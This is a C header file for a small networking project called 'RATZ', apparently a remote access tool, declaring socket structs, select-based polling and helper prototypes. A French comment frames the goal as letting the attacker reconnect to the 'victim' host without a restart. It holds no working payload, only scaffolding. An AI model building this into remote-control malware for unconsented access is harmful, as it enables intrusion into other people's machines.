/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

#ifndef RATZ_H
#define RATZ_H

// Faire en sorte que lorsque l'attaquant se deconnecte, il puisse se reconnecter sans avoir a redemarrer l'hote (la victime)

# define LOCALHOST	"127.0.0.1"
# define PORT		8080

# define _DEFAULT_SOURCE
# define DEBUG_SIZE_MAX	1024

# define _XOPEN_SOURCE	9999

# include <netinet/in.h>
# include <arpa/inet.h>
# include <sys/select.h>

# include <unistd.h>
# include <stdlib.h>
# include <errno.h>
# include <string.h>
//# include <stdarg.h>

typedef struct sockaddr_in	s_sockaddr_in;
typedef struct sockaddr		s_sockaddr;

typedef struct polling
{
	fd_set	wrset;	// network write polling
	fd_set	rdset;	// network read polling
	int		fd_max;
}	s_polling;

typedef struct ratz
{
	char*			addr;		// IP address
	int				raw_port;	// raw port (int BigEndian)
	int				server;		// server fd
	s_sockaddr_in	addri;		// socket address info
	socklen_t		addri_len;	// socket address' len
	s_polling		poll;
}	s_ratz;

void	strexit(const char* msg, int errcode);
void	ratz_set_addri(s_sockaddr_in* addri, sa_family_t af, char* ip, in_port_t raw_port);
int		ratz_write(fd_set* set, int fd, const void* buf, int nbytes);
int		ratz_read(fd_set* set, int fd, void* buf, int nbytes);
int		ratz_max(int count, int fds[count]);
int		ratz_reset_fdset(fd_set* fset, int count, int fds[count]);
int		ratz_select(s_polling* polling);
int		ratz__get_port_method(char* port);

#endif
